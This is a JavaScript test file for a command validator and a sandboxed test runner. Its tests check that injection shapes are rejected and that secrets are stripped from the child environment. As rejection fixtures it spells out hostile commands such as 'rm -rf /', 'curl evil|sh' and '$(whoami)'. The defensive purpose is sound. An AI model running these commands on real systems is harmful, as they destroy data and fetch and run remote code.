// Story-Pipeline S4 — quality.json loader/validator + the hardened test runner.
// These are the tests sr-security re-checks: the validator must REJECT every command-
// injection shape, and the runner must spawn with shell:false, a locked cwd, and a
// secret-free minimal env.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import {
  validateCmd, validateQuality, loadQuality, minimalEnv, createExecFileRunner,
  ALLOWED_BINS, DEFAULT_QUALITY,
} from "../quality.mjs";

// ── validateCmd — accept valid argv ──────────────────────────────────────────
test("validateCmd accepts an allow-listed argv array", () => {
  assert.deepEqual(validateCmd(["node", "--test"]).cmd, ["node", "--test"]);
  assert.deepEqual(validateCmd(["npm", "test"]).cmd, ["npm", "test"]);
  assert.deepEqual(validateCmd(["pytest", "-q", "tests/unit"]).cmd, ["pytest", "-q", "tests/unit"]);
  assert.deepEqual(validateCmd(["go", "test", "./..."]).cmd, ["go", "test", "./..."]);
});

// ── validateCmd — reject every bad shape (the security surface) ───────────────
test("validateCmd rejects a non-array", () => {
  assert.ok(validateCmd("node --test").error);
  assert.ok(validateCmd({ 0: "node" }).error);
});
test("validateCmd rejects an empty array", () => {
  assert.ok(validateCmd([]).error);
});
test("validateCmd rejects a non-string element", () => {
  assert.ok(validateCmd(["node", 5]).error);
  assert.ok(validateCmd(["node", null]).error);
});
test("validateCmd rejects a non-allow-listed binary", () => {
  assert.ok(validateCmd(["bash", "-c", "echo hi"]).error);
  assert.ok(validateCmd(["sh", "x"]).error);
  assert.ok(validateCmd(["rm", "-rf", "/"]).error);
  assert.ok(validateCmd(["curl", "evil.com"]).error);
});
test("validateCmd rejects an absolute / relative path binary", () => {
  assert.ok(validateCmd(["/bin/bash", "-c", "x"]).error);
  assert.ok(validateCmd(["./node", "--test"]).error);
  assert.ok(validateCmd(["../node", "--test"]).error);
  assert.ok(validateCmd(["/usr/bin/node"]).error);
});
test("validateCmd rejects shell metacharacters in ANY arg (injection shapes)", () => {
  // the exact attack shapes called out in the S4 brief
  assert.ok(validateCmd(["bash", "-c", "rm -rf ~"]).error);            // bad bin + space is fine but bin fails
  assert.ok(validateCmd(["node", "-e", "require('child_process')"]).error); // ( ) '
  assert.ok(validateCmd(["node", "--test;rm -rf /"]).error);          // ;
  assert.ok(validateCmd(["node", "--test", "&&", "curl"]).error);     // &
  assert.ok(validateCmd(["node", "$(whoami)"]).error);                // $ ( )
  assert.ok(validateCmd(["node", "`whoami`"]).error);                 // backtick
  assert.ok(validateCmd(["node", "a|b"]).error);                      // pipe
  assert.ok(validateCmd(["node", "a>b"]).error);                      // redirect
  assert.ok(validateCmd(["node", "a\nb"]).error);                     // newline
  assert.ok(validateCmd(["node", "a\0b"]).error);                     // NUL
});
test("validateCmd denylists node code-exec / module-preload flags (defense-in-depth)", () => {
  // Allow-listed `node` + SAFE_ARG chars must NOT be walkable into arbitrary code/module loads.
  assert.ok(validateCmd(["node", "-r", "evil"]).error, "-r rejected");
  assert.ok(validateCmd(["node", "--require", "evil"]).error, "--require rejected");
  assert.ok(validateCmd(["node", "--require=evil"]).error, "--require=val rejected");
  assert.ok(validateCmd(["node", "--eval", "process.exit"]).error, "--eval rejected");
  assert.ok(validateCmd(["node", "--import", "evil"]).error, "--import rejected");
  assert.ok(validateCmd(["node", "--input-type=module"]).error, "--input-type rejected");
  assert.ok(validateCmd(["node", "--experimental-vm-modules", "--test"]).error, "--experimental-* rejected");
  assert.ok(validateCmd(["node", "--loader", "./evil.mjs"]).error, "--loader rejected");
  assert.ok(validateCmd(["node", "--loader=./evil.mjs"]).error, "--loader=val rejected");
  assert.ok(validateCmd(["node", "--env-file", ".env"]).error, "--env-file rejected");
  // The legitimate runners still pass.
  assert.deepEqual(validateCmd(["node", "--test"]).cmd, ["node", "--test"], "node --test still allowed");
  assert.deepEqual(validateCmd(["npm", "test"]).cmd, ["npm", "test"], "npm test still allowed");
  // The denylist is scoped to `node` — npm forwards args to a script, so a script literally
  // named like a flag is not a node runtime flag.
  assert.ok(!validateCmd(["npm", "run", "-r"]).error, "npm args are not node flags");
});
test("validateCmd allows only null for e2e when allowNull", () => {
  assert.deepEqual(validateCmd(null, { allowNull: true }).cmd, null);
  assert.ok(validateCmd(null).error); // testCmd is required
});

// ── validateQuality — whole-config validation ────────────────────────────────
test("validateQuality accepts a well-formed config and normalizes timeout", () => {
  const { config } = validateQuality({ testCmd: ["node", "--test"], e2eCmd: null, timeoutMs: 5000 });
  assert.deepEqual(config.testCmd, ["node", "--test"]);
  assert.equal(config.e2eCmd, null);
  assert.equal(config.timeoutMs, 5000);
});
test("validateQuality clamps an out-of-range timeout", () => {
  assert.equal(validateQuality({ testCmd: ["node"], timeoutMs: 10 }).config.timeoutMs, 1000);
  assert.equal(validateQuality({ testCmd: ["node"], timeoutMs: 999999999 }).config.timeoutMs, 600000);
});
test("validateQuality rejects a poisoned testCmd (a config can't smuggle a command)", () => {
  assert.ok(validateQuality({ testCmd: ["bash", "-c", "curl evil|sh"] }).error);
  assert.ok(validateQuality({ testCmd: "node --test" }).error);
  assert.ok(validateQuality({ e2eCmd: ["node"] }).error); // testCmd missing
  assert.ok(validateQuality(null).error);
});
test("validateQuality rejects a workdir escape", () => {
  assert.ok(validateQuality({ testCmd: ["node"], workdir: "../etc" }).error);
  assert.ok(validateQuality({ testCmd: ["node"], workdir: "/abs" }).error);
  assert.equal(validateQuality({ testCmd: ["node"], workdir: "sub/dir" }).config.workdir, "sub/dir");
});
test("DEFAULT_QUALITY itself passes validation", () => {
  assert.ok(validateQuality({ ...DEFAULT_QUALITY }).config);
});

// ── loadQuality — missing/default/valid/poisoned ─────────────────────────────
test("loadQuality returns the safe default when the file is missing", () => {
  const r = loadQuality(join(tmpdir(), "does-not-exist-xyz.json"));
  assert.deepEqual(r.config.testCmd, ["node", "--test"]);
});
test("loadQuality FAILS CLOSED on a poisoned file (never a command, never a pass)", () => {
  const dir = mkdtempSync(join(tmpdir(), "ma-qual-"));
  try {
    const f = join(dir, "quality.json");
    writeFileSync(f, JSON.stringify({ testCmd: ["bash", "-c", "rm -rf /"] }));
    const r = loadQuality(f);
    assert.ok(r.error, "poisoned config must error, not run");
    assert.equal(r.config, undefined);
    writeFileSync(f, "{ not json");
    assert.ok(loadQuality(f).error, "corrupt JSON must error");
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
test("loadQuality accepts a valid file", () => {
  const dir = mkdtempSync(join(tmpdir(), "ma-qual-"));
  try {
    const f = join(dir, "quality.json");
    writeFileSync(f, JSON.stringify({ testCmd: ["npm", "test"], e2eCmd: ["playwright", "test"], timeoutMs: 30000 }));
    const r = loadQuality(f);
    assert.deepEqual(r.config.testCmd, ["npm", "test"]);
    assert.deepEqual(r.config.e2eCmd, ["playwright", "test"]);
    assert.equal(r.config.timeoutMs, 30000);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ── minimalEnv — secrets are structurally absent ─────────────────────────────
test("minimalEnv strips secrets and forwards only harmless vars", () => {
  const env = minimalEnv({
    PATH: "/usr/bin", HOME: "/home/x", LANG: "en_US.UTF-8",
    ANTHROPIC_API_KEY: "sk-ant-XXXXXXXX", GITHUB_TOKEN: "ghp_YYYY", AWS_SECRET: "zzz",
    STRIPE_API_KEY: "sk_live_1", DB_PASSWORD: "hunter2", RANDOM_VAR: "nope",
  });
  assert.equal(env.PATH, "/usr/bin");
  assert.equal(env.HOME, "/home/x");
  assert.equal(env.CI, "1");
  for (const leak of ["ANTHROPIC_API_KEY", "GITHUB_TOKEN", "AWS_SECRET", "STRIPE_API_KEY", "DB_PASSWORD", "RANDOM_VAR"]) {
    assert.equal(env[leak], undefined, `${leak} must NOT reach the child`);
  }
});

// ── createExecFileRunner — spawn options are the hardened posture ─────────────
test("runner spawns with shell:false, the given cwd, and a secret-free env", async () => {
  let captured = null;
  const fakeExec = (bin, args, opts, cb) => {
    captured = { bin, args, opts };
    // simulate a clean exit
    queueMicrotask(() => cb(null, "ok", ""));
    return { on() {} };
  };
  const run = createExecFileRunner({ exec: fakeExec });
  const res = await run({ argv: ["node", "--test"], cwd: "/work/tree", timeoutMs: 5000 });
  assert.equal(res.ok, true);
  assert.equal(captured.bin, "node");
  assert.deepEqual(captured.args, ["--test"]);
  assert.equal(captured.opts.shell, false, "shell MUST be false");
  assert.equal(captured.opts.cwd, "/work/tree", "cwd MUST be the locked worktree");
  assert.equal(captured.opts.killSignal, "SIGKILL", "timeout must SIGKILL");
  assert.equal(captured.opts.timeout, 5000);
  // env carries no secret and is the minimal set
  assert.equal(captured.opts.env.ANTHROPIC_API_KEY, undefined);
  assert.equal(captured.opts.env.CI, "1");
});
test("runner reports a non-zero exit as ok:false", async () => {
  const fakeExec = (bin, args, opts, cb) => { queueMicrotask(() => cb(Object.assign(new Error("failed"), { code: 1 }), "", "AssertionError")); return { on() {} }; };
  const res = await createExecFileRunner({ exec: fakeExec })({ argv: ["node", "--test"], cwd: "/w" });
  assert.equal(res.ok, false);
  assert.equal(res.exitCode, 1);
  assert.match(res.stderr, /AssertionError/);
});
test("runner flags a timeout kill", async () => {
  const fakeExec = (bin, args, opts, cb) => { queueMicrotask(() => cb(Object.assign(new Error("killed"), { killed: true, signal: "SIGKILL", code: null }), "", "")); return { on() {} }; };
  const res = await createExecFileRunner({ exec: fakeExec })({ argv: ["node"], cwd: "/w", timeoutMs: 1000 });
  assert.equal(res.ok, false);
  assert.equal(res.timedOut, true);
});

test("ALLOWED_BINS is the documented closed set", () => {
  for (const b of ["node", "npm", "npx", "pnpm", "yarn", "python", "python3", "pytest", "go", "cargo", "jest", "vitest", "playwright"]) {
    assert.ok(ALLOWED_BINS.has(b), `${b} should be allow-listed`);
  }
  assert.ok(!ALLOWED_BINS.has("bash"));
  assert.ok(!ALLOWED_BINS.has("sh"));
});
